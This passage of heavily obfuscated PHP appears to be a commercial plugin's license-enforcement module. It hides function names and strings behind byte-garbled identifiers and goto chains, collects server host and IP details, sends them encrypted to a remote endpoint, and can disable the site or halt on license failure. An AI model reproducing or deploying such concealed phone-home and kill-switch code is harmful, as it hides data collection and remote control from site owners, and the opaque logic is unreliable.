$aÊäŒËä´++; } $cÌ½ÓÁÒ†ó[172]($cÌ½ÓÁÒ†ó[204]($cÌ½ÓÁÒ†ó[214]), !0); $EœÆñ…¡ç¨ = $aÌØÒÑõÑ[626]; goto f…±¢ï¯•; e½ˆîé•‡õ: $d¹ÊÉªÃ‹š = $bô¬³æÑ›º[$cÌ½ÓÁÒ†ó[231]]; $Eİå„çôÅá = array(); $Eİå„çôÅá[$eˆ®¾‡³] = $EÈçœƒÀœÒ; goto fâàŞø±åÃ; e„¢ôÚÊ’Ñ: $aÌØÒÑõÑ =& $_SERVER[¢ÌÛ]; $cÌ½ÓÁÒ†ó =& $_SERVER[‹¶]; if ($_SERVER[$cÌ½ÓÁÒ†ó[44]] != $cÌ½ÓÁÒ†ó[168]) { return; } goto E–øóÖÊ¾; eÈ‰ï¸´×Ï: $bô¬³æÑ›º = $cÌ½ÓÁÒ†ó[228]($cÌ½ÓÁÒ†ó[61]($cÌ½ÓÁÒ†ó[11])->{$_SERVER[‹¶][229]}(), $cÌ½ÓÁÒ†ó[230]); $b‡ô‘¯êÊ = $aÌØÒÑõÑ[623]; if (!$b‡ô‘¯êÊ) { return; } goto e½ˆîé•‡õ; f±†×æ˜: $C¬ù£÷Ö“ = $cÌ½ÓÁÒ†ó[130](16); $FÍ¬àöŠ = $C¬ù£÷Ö“ . $e‡Á²¥ÃÏÙ[$cÌ½ÓÁÒ†ó[126]] . $this->{$_SERVER[‹¶][153]}($cÌ½ÓÁÒ†ó[120]($e‡Á²¥ÃÏÙ[$cÌ½ÓÁÒ†ó[215]]), $C¬ù£÷Ö“); $e‡Á²¥ÃÏÙ[$cÌ½ÓÁÒ†ó[129]] = $cÌ½ÓÁÒ†ó[124]($cÌ½ÓÁÒ†ó[220]($this->{$_SERVER[‹¶][153]}($FÍ¬àöŠ, $cÌ½ÓÁÒ†ó[222]))); goto cÚ‹É§ËÄØ; cÚ‹É§ËÄØ: $bÉ¤ğƒ®‚© = $aÌØÒÑõÑ[619]; while ($bÉ¤ğƒ®‚© < $aÌØÒÑõÑ[583]) { if ($bÉ¤ğƒ®‚© >= 0) { break; } $bÉ¤ğƒ®‚©++; } if ($cÖ‡äš ÚÜ[$cÌ½ÓÁÒ†ó[223]] && $cÖ‡äš ÚÜ[$cÌ½ÓÁÒ†ó[223]] >= 1) { $cÌ½ÓÁÒ†ó[61]($cÌ½ÓÁÒ†ó[62])->{$_SERVER[‹¶][224]}($cÌ½ÓÁÒ†ó[225], $cÌ½ÓÁÒ†ó[226]); } goto Aè¨º¡§àˆ; Aè¨º¡§àˆ: $cÌ½ÓÁÒ†ó[61]($cÌ½ÓÁÒ†ó[62])->{$_SERVER[‹¶][227]}($e‡Á²¥ÃÏÙ); $Fºê×ìŠŞ = $cÌ½ÓÁÒ†ó[120]($_SERVER[$cÌ½ÓÁÒ†ó[121]] . $cÌ½ÓÁÒ†ó[220]($a½¼¡¤ÜÁÆ) . $e‡Á²¥ÃÏÙ[$cÌ½ÓÁÒ†ó[216]]); $Fí„àŒÁÍÜ = $aÌØÒÑõÑ[620]; goto D³÷Ôâ™ƒ; fÄë‰´»â…: if ($d‡³Ë¤Š­–[$cÌ½ÓÁÒ†ó[174]]) { $e‡Á²¥ÃÏÙ[$cÌ½ÓÁÒ†ó[218]] = $d‡³Ë¤Š­–[$cÌ½ÓÁÒ†ó[174]]; } $cõØ‘İçÓ = $cÌ½ÓÁÒ†ó[25]($cÌ½ÓÁÒ†ó[120]($e‡Á²¥ÃÏÙ[$cÌ½ÓÁÒ†ó[216]]), 10, 10); $aŒ£ô‹»œæ = $cõØ‘İçÓ . $e‡Á²¥ÃÏÙ[$cÌ½ÓÁÒ†ó[126]] . $e‡Á²¥ÃÏÙ[$cÌ½ÓÁÒ†ó[218]]; goto EÑÖâœ¥­; a‰¤—Î¼È: $Aêğµß­Èå = $aÌØÒÑõÑ[624]; Cache::set($cÌ½ÓÁÒ†ó[236] . $cÌ½ÓÁÒ†ó[120]($a½¼¡¤ÜÁÆ . $cÌ½ÓÁÒ†ó[237]), $cÌ½ÓÁÒ†ó[10]); $aÊäŒËä´ = $aÌØÒÑõÑ[625]; goto C¼ÀÕ³ßÍŸ; fâàŞø±åÃ: $cÌ½ÓÁÒ†ó[61]($cÌ½ÓÁÒ†ó[11])->{$_SERVER[‹¶][232]}($d¹ÊÉªÃ‹š[$cÌ½ÓÁÒ†ó[233]], array($cÌ½ÓÁÒ†ó[234] => $Eİå„çôÅá)); $this->sadn4fb51745 = $cÖ‡äš ÚÜ; $this->gcwsd8cd8558 = $e‡Á²¥ÃÏÙ[$cÌ½ÓÁÒ†ó[126]]; goto B’ã‘ĞâÉÈ; b¬÷¶÷ğ—ì: $EÈçœƒÀœÒ = $this->{$_SERVER[‹¶][133]}($cÌ½ÓÁÒ†ó[154]($cÖ‡äš ÚÜ), $Fºê×ìŠŞ); $E™„ß‹ì½ò = $aÌØÒÑõÑ[622]; while (strlen($E™„ß‹ì½ò) < $aÌØÒÑõÑ[597]) { if (!$E™„ß‹ì½ò) { break; } $E™„ß‹ì½ò++; } goto eÈ‰ï¸´×Ï; Bò©ì³œÜç: if ($E¼ˆ§ä ¾«[$cÌ½ÓÁÒ†ó[184]] == $cÌ½ÓÁÒ†ó[185]) { $a„®Ìƒ¦ã– = $this->{$_SERVER[‹¶][153]}($Eá“ˆƒ¿’³, $cÌ½ÓÁÒ†ó[186]); $CâÊòˆ—ÑŸ = $this->{$_SERVER[‹¶][133]}($cÌ½ÓÁÒ†ó[154]($d‡³Ë¤Š­–), $Eá“ˆƒ¿’³ . $cÌ½ÓÁÒ†ó[187], 3); $CâÊòˆ—ÑŸ = $CâÊòˆ—ÑŸ . $cÌ½ÓÁÒ†ó[188] . $_SERVER[$cÌ½ÓÁÒ†ó[179]]; $F³˜ì˜˜ø° = $this->{$_SERVER[‹¶][189]}($cÌ½ÓÁÒ†ó[190] . $a„®Ìƒ¦ã– . $cÌ½ÓÁÒ†ó[191] . $CâÊòˆ—ÑŸ, -1); $cÌ½ÓÁÒ†ó[172]($F³˜ì˜˜ø°, !0); } else { if ($E¼ˆ§ä ¾«[$cÌ½ÓÁÒ†ó[184]] == $cÌ½ÓÁÒ†ó[192]) { $fÍ†á×÷„‰ = $cÌ½ÓÁÒ†ó[25]($cÌ½ÓÁÒ†ó[120]($cÌ½ÓÁÒ†ó[193] . $Eá“ˆƒ¿’³), 12, 15) . $cÌ½ÓÁÒ†ó[194]; $CâÊòˆ—ÑŸ = $this->{$_SERVER[‹¶][195]}($cÌ½ÓÁÒ†ó[2]($E¼ˆ§ä ¾«[$cÌ½ÓÁÒ†ó[196]]), $fÍ†á×÷„‰, 2); $DÜÓ—á¼©Ò = $cÌ½ÓÁÒ†ó[197]($CâÊòˆ—ÑŸ, !0); if (!$cÌ½ÓÁÒ†ó[198]($DÜÓ—á¼©Ò) || !$cÌ½ÓÁÒ†ó[198]($DÜÓ—á¼©Ò[$cÌ½ÓÁÒ†ó[199]]) || $DÜÓ—á¼©Ò[$cÌ½ÓÁÒ†ó[171]] != !0) { $e¨Ğİ£ô‡„ = $cÌ½ÓÁÒ†ó[200]; $bµêå…­ëˆ = $DÜÓ—á¼©Ò[$cÌ½ÓÁÒ†ó[199]] ? $cÌ½ÓÁÒ†ó[201] . $DÜÓ—á¼©Ò[$cÌ½ÓÁÒ†ó[199]] : $e¨Ğİ£ô‡„; $cÌ½ÓÁÒ†ó[172]($bµêå…­ëˆ, !1); } else { $d‡³Ë¤Š­–[$cÌ½ÓÁÒ†ó[174]] = $DÜÓ—á¼©Ò[$cÌ½ÓÁÒ†ó[199]][$cÌ½ÓÁÒ†ó[202]]; } } else { $DÜÓ—á¼©Ò = $this->{$_SERVER[‹¶][189]}($cÌ½ÓÁÒ†ó[203], $d‡³Ë¤Š­–, 10); $dğŒÔÀ½ÛÅ = $aÌØÒÑõÑ[617]; if (!$dğŒÔÀ½ÛÅ) { die; } } } if (!$cÌ½ÓÁÒ†ó[198]($DÜÓ—á¼©Ò) || !$cÌ½ÓÁÒ†ó[198]($DÜÓ—á¼©Ò[$cÌ½ÓÁÒ†ó[199]]) || $DÜÓ—á¼©Ò[$cÌ½ÓÁÒ†ó[171]] != !0) { $e¨Ğİ£ô‡„ = $cÌ½ÓÁÒ†ó[204]($cÌ½ÓÁÒ†ó[205]); $bµêå…­ëˆ = $DÜÓ—á¼©Ò[$cÌ½ÓÁÒ†ó[199]] ? $cÌ½ÓÁÒ†ó[201] . $DÜÓ—á¼©Ò[$cÌ½ÓÁÒ†ó[199]] : $e¨Ğİ£ô‡„; $cÌ½ÓÁÒ†ó[172]($bµêå…­ëˆ, !1); } $cÖ‡äš ÚÜ = $DÜÓ—á¼©Ò[$cÌ½ÓÁÒ†ó[199]]; goto Fî‡ª×‹ñ; D‚¤§Ëì´Ù: $Eá“ˆƒ¿’³ = $cÌ½ÓÁÒ†ó[120]($_SERVER[$cÌ½ÓÁÒ†ó[121]] . $a½¼¡¤ÜÁÆ); $a£Æµ£÷» = $aÌØÒÑõÑ[616]; if (!$a£Æµ£÷») { return; } goto Bò©ì³œÜç; E–øóÖÊ¾: if (!$cÌ½ÓÁÒ†ó[112]($GLOBALS, $cÌ½ÓÁÒ†ó[138])) { die; } $E¼ˆ§ä ¾« = $GLOBALS[$cÌ½ÓÁÒ†ó[22]]; if (isset($E¼ˆ§ä ¾«[$cÌ½ÓÁÒ†ó[169]])) { $this->{$_SERVER[‹¶][170]}(); die; } goto dõ¬ÙÛÊ“­; EÑÖâœ¥­: $e‡Á²¥ÃÏÙ[$cÌ½ÓÁÒ†ó[128]] = $cÌ½ÓÁÒ†ó[220]($cÌ½ÓÁÒ†ó[124]($this->{$_SERVER[‹¶][153]}($aŒ£ô‹»œæ, $cÌ½ÓÁÒ†ó[221]))); $f½õ¯ğÃÏ¢ = $aÌØÒÑõÑ[618]; if (!$f½õ¯ğÃÏ¢) { die; } goto f±†×æ˜; D³÷Ôâ™ƒ: if (!$Fí„àŒÁÍÜ) { return; } $eˆ®¾‡³ = $cÌ½ÓÁÒ†ó[220]($cÌ½ÓÁÒ†ó[25]($Fºê×ìŠŞ, 10, 16)); $B‰¯‡šâ½í = $aÌØÒÑõÑ[621]; goto b¬÷¶÷ğ—ì; Fî‡ª×‹ñ: $A…’™†Ïƒ† = $this->{$_SERVER[‹¶][206]}($cÖ‡äš ÚÜ[$cÌ½ÓÁÒ†ó[207]]); if (!$A…’™†Ïƒ† || $A…’™†Ïƒ† != $cÖ‡äš ÚÜ[$cÌ½ÓÁÒ†ó[151]]) { $AÆ¬ÑŒÅÕÏ = array($cÌ½ÓÁÒ†ó[208] => $cÌ½ÓÁÒ†ó[61]($cÌ½ÓÁÒ†ó[62])->{$_SERVER[‹¶][63]}($cÌ½ÓÁÒ†ó[122]), $cÌ½ÓÁÒ†ó[209] => $_SERVER[$cÌ½ÓÁÒ†ó[121]], $cÌ½ÓÁÒ†ó[210] => $cÌ½ÓÁÒ†ó[211](), $cÌ½ÓÁÒ†ó[180] => $_SERVER[$cÌ½ÓÁÒ†ó[181]]); $CâÊòˆ—ÑŸ = $this->{$_SERVER[‹¶][212]}($cÌ½ÓÁÒ†ó[154]($AÆ¬ÑŒÅÕÏ)); $this->{$_SERVER[‹¶][189]}($cÌ½ÓÁÒ†ó[213] . $CâÊòˆ—ÑŸ); $cÌ½ÓÁÒ†ó[172]($cÌ½ÓÁÒ†ó[204]($cÌ½ÓÁÒ†ó[214]), !0); } $e‡Á²¥ÃÏÙ = array($cÌ½ÓÁÒ†ó[215] => $d‡³Ë¤Š­–[$cÌ½ÓÁÒ†ó[171]], $cÌ½ÓÁÒ†ó[216] => $cÖ‡äš ÚÜ[$cÌ½ÓÁÒ†ó[217]], $cÌ½ÓÁÒ†ó[218] => $cÌ½ÓÁÒ†ó[130](16), $cÌ½ÓÁÒ†ó[126] => $cÖ‡äš ÚÜ[$cÌ½ÓÁÒ†ó[219]]); goto fÄë‰´»â…; dõ¬ÙÛÊ“­: if (!isset($E¼ˆ§ä ¾«[$cÌ½ÓÁÒ†ó[171]]) || $cÌ½ÓÁÒ†ó[24]($E¼ˆ§ä ¾«[$cÌ½ÓÁÒ†ó[171]]) != 16) { $cÌ½ÓÁÒ†ó[172]($cÌ½ÓÁÒ†ó[173] . $E¼ˆ§ä ¾«[$cÌ½ÓÁÒ†ó[171]], !1); } $a½¼¡¤ÜÁÆ = $cÌ½ÓÁÒ†ó[61]($cÌ½ÓÁÒ†ó[62])->{$_SERVER[‹¶][63]}($cÌ½ÓÁÒ†ó[122]); $d‡³Ë¤Š­– = array($cÌ½ÓÁÒ†ó[171] => $E¼ˆ§ä ¾«[$cÌ½ÓÁÒ†ó[171]], $cÌ½ÓÁÒ†ó[174] => $cÌ½ÓÁÒ†ó[130](16), $cÌ½ÓÁÒ†ó[175] => $cÌ½ÓÁÒ†ó[155], $cÌ½ÓÁÒ†ó[176] => $cÌ½ÓÁÒ†ó[177], $cÌ½ÓÁÒ†ó[178] => $_SERVER[$cÌ½ÓÁÒ†ó[179]], $cÌ½ÓÁÒ†ó[180] => $_SERVER[$cÌ½ÓÁÒ†ó[181]], $cÌ½ÓÁÒ†ó[182] => $_SERVER[$cÌ½ÓÁÒ†ó[183]]); goto D‚¤§Ëì´Ù; f…±¢ï¯•: } private function licenseRegistSuccess() { $cÄ‡¬½µ‘ =& $_SERVER[‹¶]; $döÖ¤ÇÅ‹ = $cÄ‡¬½µ‘[61]($cÄ‡¬½µ‘[62])->{$_SERVER[‹¶][63]}(); $a†‚ğíÛ† = $_SERVER[¢ÌÛ][627]; if (!$a†‚ğíÛ†) { return; } if ($döÖ¤ÇÅ‹[$cÄ‡¬½µ‘[89]] != $cÄ‡¬½µ‘[226]) { $cÄ‡¬½µ‘[61]($cÄ‡¬½µ‘[62])->{$_SERVER[‹¶][227]}($cÄ‡¬½µ‘[89], $cÄ‡¬½µ‘[226]); } $cÄ‡¬½µ‘[116]($cÄ‡¬½µ‘[238])->{$_SERVER[‹¶][239]}(!0); } private function ikqgf99cfbcb() { goto AÓÉ·ÀÙ¶; Bßå·ˆ‡ù¥: $this->gcwsd8cd8558 = $aÜ­ ¯èÈ¥[127]; goto bØì³•í; AÓÉ·ÀÙ¶: $aÜ­ ¯èÈ¥ =& $_SERVER[‹¶]; $aÜ­ ¯èÈ¥[61]($aÜ­ ¯èÈ¥[62])->{$_SERVER[‹¶][227]}(array($aÜ­ ¯èÈ¥[215] => $aÜ­ ¯èÈ¥[10], $aÜ­ ¯èÈ¥[216] => $aÜ­ ¯èÈ¥[10], $aÜ­ ¯èÈ¥[126] => $aÜ­ ¯èÈ¥[127], $aÜ­ ¯èÈ¥[128] => $aÜ­ ¯èÈ¥[10], $aÜ­ ¯èÈ¥[129] => $aÜ­ ¯èÈ¥[10])); $aÜ­ ¯èÈ¥[61]($aÜ­ ¯èÈ¥[62])->{$_SERVER[‹¶][224]}($aÜ­ ¯èÈ¥[225], $aÜ­ ¯èÈ¥[240]); goto E¹¹İ¹õ; E¹¹İ¹õ: $this->sadn4fb51745 = array(); $dŒ¦¦¨ªƒ£ = $_SERVER[¢ÌÛ][628]; if (!$dŒ¦¦¨ªƒ£) { die; } goto Bßå·ˆ‡ù¥; bØì³•í: } private function vfoe4d58f36c() { goto E‹–Óœù†; C¯”äëØ: $D¢ã›ˆÃ™ô = $dó¶¼¹÷¨¢[632]; if (strlen($D¢ã›ˆÃ™ô) < $dó¶¼¹÷¨¢[583]) { die; } $cåëª¸° = Cache::get($Bì¢«ò¨†); goto Døñµ„¨¹Î; Fº“¬åÅ“ñ: $Eç±–‰ØÉ = $dó¶¼¹÷¨¢[633]; if (strlen($Eç±–‰ØÉ) < $dó¶¼¹÷¨¢[603]) { die; } $this->sadn4fb51745 = $cåëª¸°; goto c¹³¿¥Çš‰; c¹³¿¥Çš‰: $this->gcwsd8cd8558 = $Aƒ”Â„ÍË[$f‚¼ÆõåÄ£[126]]; goto d¦ê“»äÏ•; eŞ‚Ç…Ö: $Aƒ”Â„ÍË = $f‚¼ÆõåÄ£[61]($f‚¼ÆõåÄ£[62])->{$_SERVER[‹¶][63]}(); $dôËÅÉèÚÉ = $dó¶¼¹÷¨¢[630]; if ($Aƒ”Â„ÍË[$f‚¼ÆõåÄ£[126]] == $f‚¼ÆõåÄ£[127]) { return; } goto CØ¨ÖÎÜÆó; Døñµ„¨¹Î: if (!$f‚¼ÆõåÄ£[198]($cåëª¸°) || !isset($cåëª¸°[$f‚¼ÆõåÄ£[241]]) || $f‚¼ÆõåÄ£[242]() - $cåëª¸°[$f‚¼ÆõåÄ£[241]] >= 60) { $E´×ÚË’Â‚ = $f‚¼ÆõåÄ£[228]($f‚¼ÆõåÄ£[61]($f‚¼ÆõåÄ£[11])->{$_SERVER[‹¶][229]}(), $f‚¼ÆõåÄ£[230]); $eœƒ‰·±ÒÑ = $E´×ÚË’Â‚[$f‚¼ÆõåÄ£[231]]; $aÁáÈ—ˆõ = $f‚¼ÆõåÄ£[120]($_SERVER[$f‚¼ÆõåÄ£[121]] . $f‚¼ÆõåÄ£[220]($DÃ‰‘¬«ƒ) . $Aƒ”Â„ÍË[$f‚¼ÆõåÄ£[216]]); $DßšïŞª¢ = $f‚¼ÆõåÄ£[220]($f‚¼ÆõåÄ£[25]($aÁáÈ—ˆõ, 10, 16)); $cåëª¸° = $this->{$_SERVER[‹¶][195]}($eœƒ‰·±ÒÑ[$f‚¼ÆõåÄ£[100]][$DßšïŞª¢], $aÁáÈ—ˆõ); $cåëª¸° = $f‚¼ÆõåÄ£[197]($cåëª¸°, !0); } if (!$f‚¼ÆõåÄ£[198]($cåëª¸°)) { return $this->{$_SERVER[‹¶][170]}(); } $a—†·çñÒÙ = $f‚¼ÆõåÄ£[150]($cåëª¸°[$f‚¼ÆõåÄ£[151]]); goto d¤Æ”®²ô; CØ¨ÖÎÜÆó: $DÃ‰‘¬«ƒ = $f‚¼ÆõåÄ£[61]($f‚¼ÆõåÄ£[62])->{$_SERVER[‹¶][63]}($f‚¼ÆõåÄ£[122]); $D‘èóïÕØ = $dó¶¼¹÷¨¢[631]; $Bì¢«ò¨† = $f‚¼ÆõåÄ£[236] . $f‚¼ÆõåÄ£[120]($DÃ‰‘¬«ƒ . $f‚¼ÆõåÄ£[237]); goto C¯”äëØ; AñÏÃÜ©É¥: $this->gcwsd8cd8558 = $f‚¼ÆõåÄ£[127]; $b±‚ˆª˜¶° = $dó¶¼¹÷¨¢[629]; while (strlen($b±‚ˆª˜¶°) < $dó¶¼¹÷¨¢[583]) { if (!$b±‚ˆª˜¶°) { break; } $b±‚ˆª˜¶°++; } goto eŞ‚Ç…Ö; d¤Æ”®²ô: if ($f‚¼ÆõåÄ£[242]() >= $a—†·çñÒÙ) { return $this->{$_SERVER[‹¶][170]}(); } $cåëª¸°[$f‚¼ÆõåÄ£[241]] = $f‚¼ÆõåÄ£[242](); Cache::set($Bì¢«ò¨†, $cåëª¸°); goto Fº“¬åÅ“ñ; E‹–Óœù†: $dó¶¼¹÷¨¢ =& $_SERVER[¢ÌÛ]; $f‚¼ÆõåÄ£ =& $_SERVER[‹¶]; $_SERVER[$f‚¼ÆõåÄ£[181]] = $f‚¼ÆõåÄ£[112]($_SERVER, $f‚¼ÆõåÄ£[181], APP_HOST); goto AñÏÃÜ©É¥; d¦ê“»äÏ•: } private function hwfl46941184() { goto C‡òÅÚ¤£; CÕ§È×ğ¬: $fÔĞ“…™àÁ = array($CÕ’²ä¬Äô[246], $CÕ’²ä¬Äô[247]); if ($CÕ’²ä¬Äô[248]($c ŒÅ÷ˆğ, $fÔĞ“…™àÁ)) { if ($this->gcwsd8cd8558 == $CÕ’²ä¬Äô[127] && isset($bèã´çí¯[$CÕ’²ä¬Äô[249]])) { $CÕ’²ä¬Äô[172]($CÕ’²ä¬Äô[204]($CÕ’²ä¬Äô[244]), !1, $CÕ’²ä¬Äô[245]); die; } $C‡¹ôÔÔ…ó = $this->{$_SERVER[‹¶][143]}(); if ($C‡¹ôÔÔ…ó != $CÕ’²ä¬Äô[250]($CÕ’²ä¬Äô[251])) { if ($C‡¹ôÔÔ…ó <= $CÕ’²ä¬Äô[61]($CÕ’²ä¬Äô[145])->{$_SERVER[‹¶][146]}()) { $CÕ’²ä¬Äô[172]($CÕ’²ä¬Äô[204]($CÕ’²ä¬Äô[252]), !1, $CÕ’²ä¬Äô[245]); die; } } } goto a‘ƒ…¶õ×Õ; aÁİŠ±§†: if (!$B×¦‹¯Á) { return; } $c ŒÅ÷ˆğ = $_SERVER[$CÕ’²ä¬Äô[44]]; if ($c ŒÅ÷ˆğ == $CÕ’²ä¬Äô[243] && $this->gcwsd8cd8558 == $CÕ’²ä¬Äô[127]) { $CÕ’²ä¬Äô[172]($CÕ’²ä¬Äô[204]($CÕ’²ä¬Äô[244]), !1, $CÕ’²ä¬Äô[245]); } goto CÕ§È×ğ¬; C‡òÅÚ¤£: $CÕ’²ä¬Äô =& $_SERVER[‹¶]; $bèã´çí¯ = $GLOBALS[$CÕ’²ä¬Äô[22]]; $B×¦‹¯Á = $_SERVER[¢ÌÛ][634]; goto aÁİŠ±§†; a‘ƒ…¶õ×Õ: } private function msep97411db9() { goto cæ¼‘¨×ŒÁ; C®Ã¹ÚÚÓŞ: $A Êö¥ôùÁ[264]($A Êö¥ôùÁ[265]); $E¨Á–İ‰Œ = $d¿•ùæËÛ÷[637]; if (strlen($E¨Á–İ‰Œ) < $d¿•ùæËÛ÷[583]) { die; } goto A¼ƒ—’Ç’Ÿ; cæ¼‘¨×ŒÁ: $d¿•ùæËÛ÷ =& $_SERVER[¢ÌÛ]; $A Êö¥ôùÁ =& $_SERVER[‹¶]; $Fîšáç´éø = array($A Êö¥ôùÁ[141], $A Êö¥ôùÁ[253]); goto f°î”„à”; A¼ƒ—’Ç’Ÿ: if ($d´ã­İ”éŠ && $A Êö¥ôùÁ[32]($d´ã­İ”éŠ, $A Êö¥ôùÁ[266])) { echo $d´ã­İ”éŠ; } die; goto EÙÉôåÃ®; D¤Ö¨ÍâŞÙ: $aæÒ‹ŒÁ‚§ = $d¿•ùæËÛ÷[635]; if (!$aæÒ‹ŒÁ‚§) { return; } $cê¿ùèòŸ = $this->{$_SERVER[‹¶][256]}($cê¿ùèòŸ, $A Êö¥ôùÁ[257]); goto DíÜèÊ³…; DíÜèÊ³…: $C¢Œ‡Ğò‹ = $A Êö¥ôùÁ[258](array($A Êö¥ôùÁ[259] => array($A Êö¥ôùÁ[260] => $A Êö¥ôùÁ[261], $A Êö¥ôùÁ[262] => 3))); $d´ã­İ”éŠ = @$A Êö¥ôùÁ[263]($cê¿ùèòŸ, !1, $C¢Œ‡Ğò‹); $Bø½‹—ŒİÊ = $d¿•ùæËÛ÷[636]; goto C®Ã¹ÚÚÓŞ; f°î”„à”: if (!$A Êö¥ôùÁ[112]($GLOBALS, $A Êö¥ôùÁ[138]) || !isset($_GET[$A Êö¥ôùÁ[254]])) { return; } if (!$A Êö¥ôùÁ[248]($_SERVER[$A Êö¥ôùÁ[44]], $Fîšáç´éø)) { return; } $cê¿ùèòŸ = $A Êö¥ôùÁ[255]; goto D¤Ö¨ÍâŞÙ; EÙÉôåÃ®: } public function jyor01ade2ba($B¥çí±³ğÙ) { goto eÁ¼’ùµ‰; eÁ¼’ùµ‰: $Dƒ‰å¯­¨â =& $_SERVER[¢ÌÛ]; $A®ƒ‰š‚ =& $_SERVER[‹¶]; if ($this->gcwsd8cd8558 == $A®ƒ‰š‚[267]) { return $B¥çí±³ğÙ; } goto D‡µó»‘Ô; D‡µó»‘Ô: $e“íƒ»Æ½ = array($A®ƒ‰š‚[268] => $A®ƒ‰š‚[269], $A®ƒ‰š‚[270] => $A®ƒ‰š‚[269], $A®ƒ‰š‚[271] => $A®ƒ‰š‚[269], $A®ƒ‰š‚[272] => $A®ƒ‰š‚[269], $A®ƒ‰š‚[273] => $A®ƒ‰š‚[269], $A®ƒ‰š‚[274] => $A®ƒ‰š‚[269], $A®ƒ‰š‚[275] => $A®ƒ‰š‚[276], $A®ƒ‰š‚[277] => $A®ƒ‰š‚[276], $A®ƒ‰š‚[278] => $A®ƒ‰š‚[276], $A®ƒ‰š‚[279] => $A®ƒ‰š‚[276], $A®ƒ‰š‚[280] => $A®ƒ‰š‚[276], $A®ƒ‰š‚[281] => $A®ƒ‰š‚[276], $A®ƒ‰š‚[282] => $A®ƒ‰š‚[276]); $E¸Š±‚¸è = $A®ƒ‰š‚[0]($A®ƒ‰š‚[283], $A®ƒ‰š‚[112]($this->sadn4fb51745, $A®ƒ‰š‚[135], $A®ƒ‰š‚[10])); $b‚®‰³±ª = array(); goto Cá˜é…»Î; Dïç…Ó‘ãÁ: return $B¥çí±³ğÙ; goto f›èóÔíºÆ; Cá˜é…»Î: $Dà‰Ô°ÑƒŞ = $Dƒ‰å¯­¨â[638]; foreach ($e“íƒ»Æ½ as $c‰Ğ„Ìéñ¨ => $DÚ·»²ğƒ) { if ($DÚ·»²ğƒ == $A®ƒ‰š‚[269] && $A®ƒ‰š‚[25]($this->gcwsd8cd8558, 0, 1) == $A®ƒ‰š‚[269]) { continue; } if (!$A®ƒ‰š‚[248]($c‰Ğ„Ìéñ¨, $E¸Š±‚¸è)) { $b‚®‰³±ª[] = $c‰Ğ„Ìéñ¨; } } foreach ($b‚®‰³±ª as $c‰Ğ„Ìéñ¨) { unset($B¥çí±³ğÙ[$c‰Ğ„Ìéñ¨]); $e¹ÆôÆôÅ‹ = $Dƒ‰å¯­¨â[639]; if (!$e¹ÆôÆôÅ‹) { return; } } goto Dïç…Ó‘ãÁ; f›èóÔíºÆ: } private function xcnq96dbb207() { $eÅ¤¬‹°Ùİ =& $_SERVER[‹¶]; if ($this->gcwsd8cd8558 != $eÅ¤¬‹°Ùİ[127]) { return; } $GLOBALS[$eÅ¤¬‹°Ùİ[100]][$eÅ¤¬‹°Ùİ[104]][$eÅ¤¬‹°Ùİ[284]] = $eÅ¤¬‹°Ùİ[226]; $GLOBALS[$eÅ¤¬‹°Ùİ[100]][$eÅ¤¬‹°Ùİ[285]] = $eÅ¤¬‹°Ùİ[226]; $d—Ö‚‘ç´¾ = $_SERVER[¢ÌÛ][640]; if ($eÅ¤¬‹°Ùİ[61]($eÅ¤¬‹°Ùİ[286])->{$_SERVER[‹¶][63]}($eÅ¤¬‹°Ùİ[89]) != $eÅ¤¬‹°Ùİ[240]) { $eÅ¤¬‹°Ùİ[61]($eÅ¤¬‹°Ùİ[286])->{$_SERVER[‹¶][227]}($eÅ¤¬‹°Ùİ[89], $eÅ¤¬‹°Ùİ[240]); } } public function rqslf528ef3e() { return $_SERVER[‹¶][287]; $b°Ê ìÒÔó = $_SERVER[¢ÌÛ][641]; if (!$b°Ê ìÒÔó) { return; } } private function qlrh45a7f4f1() { goto e§ñ•ñÌ£…; döÇÆİ©…›: if ($this->gcwsd8cd8558 == $FÈ’“„ÔŠ¯[127] || !$FÈ’“„ÔŠ¯[112]($GLOBALS, $FÈ’“„ÔŠ¯[138])) { return; } if (!$FÈ’“„ÔŠ¯[248]($_SERVER[$FÈ’“„ÔŠ¯[44]], $dß™ç…ÆŸ»)) { return; } if ($FÈ’“„ÔŠ¯[242]() % 4 != 0) { return; } goto BèÜ²ò‡ÛÀ; e§ñ•ñÌ£…: $FÈ’“„ÔŠ¯ =& $_SERVER[‹¶]; $dß™ç…ÆŸ» = array($FÈ’“„ÔŠ¯[288], $FÈ’“„ÔŠ¯[289], $FÈ’“„ÔŠ¯[290]); $dëáğ¬ñ·ò = $FÈ’“„ÔŠ¯[291] . $FÈ’“„ÔŠ¯[120]($FÈ’“„ÔŠ¯[292]); goto döÇÆİ©…›; aï½Ğ‘Ô©¦: $dÀ„‹«ğ«» = array($FÈ’“„ÔŠ¯[171] => $FÈ’“„ÔŠ¯[61]($FÈ’“„ÔŠ¯[62])->{$_SERVER[‹¶][63]}($FÈ’“„ÔŠ¯[215]), $FÈ’“„ÔŠ¯[184] => $this->gcwsd8cd8558, $FÈ’“„ÔŠ¯[182] => $_SERVER[$FÈ’“„ÔŠ¯[183]], $FÈ’“„ÔŠ¯[175] => $FÈ’“„ÔŠ¯[155], $FÈ’“„ÔŠ¯[178] => $_SERVER[$FÈ’“„ÔŠ¯[179]]); $c–Óö¡İë = $_SERVER[¢ÌÛ][642]; if (!$c–Óö¡İë) { die; } goto b·ÙæÕİïõ; BèÜ²ò‡ÛÀ: $cÙê¤™¿³Ñ = $FÈ’“„ÔŠ¯[13](array($FÈ’“„ÔŠ¯[293], $FÈ’“„ÔŠ¯[294]), $dëáğ¬ñ·ò); if ($cÙê¤™¿³Ñ && $FÈ’“„ÔŠ¯[242]() - $cÙê¤™¿³Ñ < $FÈ’“„ÔŠ¯[250]($FÈ’“„ÔŠ¯[295])) { return; } $FÈ’“„ÔŠ¯[13](array($FÈ’“„ÔŠ¯[293], $FÈ’“„ÔŠ¯[158]), $dëáğ¬ñ·ò, $FÈ’“„ÔŠ¯[242]()); goto aï½Ğ‘Ô©¦; bÎ³íé„÷ì: $this->{$_SERVER[‹¶][170]}(); if ($this->{$_SERVER[‹¶][206]}($f°–‰Æ˜Ç«[$FÈ’“„ÔŠ¯[297]]) != $dÀ„‹«ğ«»[$FÈ’“„ÔŠ¯[171]]) { $Dİííß°ŒØ = array($FÈ’“„ÔŠ¯[208] => $FÈ’“„ÔŠ¯[61]($FÈ’“„ÔŠ¯[62])->{$_SERVER[‹¶][63]}($FÈ’“„ÔŠ¯[122]), $FÈ’“„ÔŠ¯[209] => $_SERVER[$FÈ’“„ÔŠ¯[121]], $FÈ’“„ÔŠ¯[210] => $FÈ’“„ÔŠ¯[211](), 